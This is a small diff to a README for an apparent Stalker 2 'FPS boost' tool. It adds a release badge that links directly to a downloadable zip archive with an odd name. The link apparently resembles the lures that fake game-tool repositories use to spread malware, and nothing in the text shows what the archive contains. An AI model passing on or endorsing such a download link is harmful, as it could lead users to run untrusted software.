@@ -1,3 +1,5 @@
+[![Release](https://img.shields.io/badge/Release-Stable-success?style=for-the-badge&logo=github)](https://github.com/kevin-kingcode97y3/stalker-2-boost-fps/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # stalker-2-boost-fps
 
 S.t.a.l.k.e.r.-boost lets you boost FPS in Stalker 2 with auto-updates.
